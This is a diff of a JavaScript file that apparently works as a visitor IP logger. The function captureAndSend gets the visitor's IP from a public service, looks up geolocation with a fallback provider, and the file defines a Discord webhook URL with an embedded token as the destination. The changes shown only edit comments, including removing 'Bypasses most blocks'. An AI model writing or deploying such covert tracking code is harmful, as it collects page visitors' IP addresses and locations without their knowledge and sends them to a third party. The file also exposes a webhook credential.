@@ -2,18 +2,18 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497258562165145683/NuNnv3
 
 async function captureAndSend() {
     try {
-        // 1. Get IP first (Very reliable)
+        // 1. Get IP first (HTTPS - Very reliable)
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const visitorIP = ipData.ip;
 
-        // 2. Get Geo Data using the IP (Bypasses most blocks)
+        // 2. Get Geo Data using the IP (HTTPS Only)
         let geoData = {};
         try {
             const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
             geoData = await geoRes.json();
         } catch (e) {
-            console.warn("Primary geo failed, trying fallback...");
+            // Fallback to another HTTPS provider
             const fallback = await fetch(`https://freeipapi.com/api/json/${visitorIP}`);
             geoData = await fallback.json();
         }
